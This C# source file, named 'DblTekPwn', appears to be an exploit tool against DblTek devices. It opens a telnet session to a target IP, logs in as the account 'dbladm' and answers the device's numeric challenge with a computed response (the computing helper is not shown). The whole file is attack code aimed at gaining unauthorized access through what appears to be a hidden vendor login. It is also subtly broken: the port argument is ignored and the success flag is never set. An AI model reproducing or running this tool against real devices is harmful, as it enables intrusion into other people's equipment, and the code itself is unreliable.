using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace DblTekPwn
{
    public class DblTekPwn
    {
        private Process process;

        public DblTekPwn(string ip, int port = 23)
        {
            process = new Process
            {
                StartInfo =
                {
                    FileName = "telnet",
                    Arguments = ip,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    ErrorDialog = false
                }
            };

            process.Start();
        }

        public bool Pwn()
        {
            new Thread(() => checkProcess(process)).Start();

            bool ret = false;
            try
            {
                var standardOutput = process.StandardOutput;
                var standardInput = process.StandardInput;
                standardInput.AutoFlush = true;
                standardInput.WriteLine("dbladm");
                for (int i = 0; i < 7; i++) standardOutput.ReadLine();

                string challengeLine = standardOutput.ReadLine();

                if (!challengeLine.StartsWith("challenge: N"))
                    return false;

                string response = DblTekChallenge.ComputeChallenge(Convert.ToInt32(challengeLine.Substring(challengeLine.IndexOf("N") + 1)));
                standardInput.WriteLine(response);

            }
            catch (Exception ex)
            {
                return ret;
            }
            return ret;
        }

        private void checkProcess(Process process)
        {
            Thread.Sleep(15000);
            try
            {
                process.Kill();
            }
            catch
            {

            }
        }
    }
}
